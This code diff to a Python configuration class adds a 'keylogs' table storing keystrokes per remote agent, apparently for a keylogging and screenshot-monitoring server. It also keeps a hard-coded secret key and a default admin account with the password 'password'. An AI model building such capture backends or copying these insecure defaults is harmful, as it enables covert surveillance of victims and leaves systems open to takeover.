@@ -13,7 +13,7 @@ class Config:
         self.screenshot_folder = "screenshots"
         self.max_content_length = 16 * 1024 * 1024  # 16MB
         self.secret_key = "mQsjJsMfsW43sdzPf9L2Sr78"
-        self.version = "1.4.6"
+        self.version = "1.4.7"
         self.monitor_token = secrets.token_urlsafe(32)  
 
         
@@ -94,7 +94,17 @@ class Config:
             CREATE TABLE IF NOT EXISTS users (
                 id INTEGER PRIMARY KEY,
                 username TEXT UNIQUE,
-                password TEXT
+                password TEXT,
+                email TEXT
+            )
+        ''')
+
+        c.execute('''
+            CREATE TABLE IF NOT EXISTS keylogs (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                agent_id TEXT NOT NULL,
+                keys TEXT NOT NULL,
+                timestamp TEXT NOT NULL
             )
         ''')
 
@@ -114,8 +124,8 @@ class Config:
         
         # Add default admin if not exists
         from werkzeug.security import generate_password_hash
-        c.execute("INSERT OR IGNORE INTO users VALUES (?, ?, ?)", 
-                 (1, "admin", generate_password_hash("password")))
+        c.execute("INSERT OR IGNORE INTO users VALUES (?, ?, ?, ?)", 
+                 (1, "admin", generate_password_hash("password"),"admin@home.no"))
         
         conn.commit()
         conn.close()
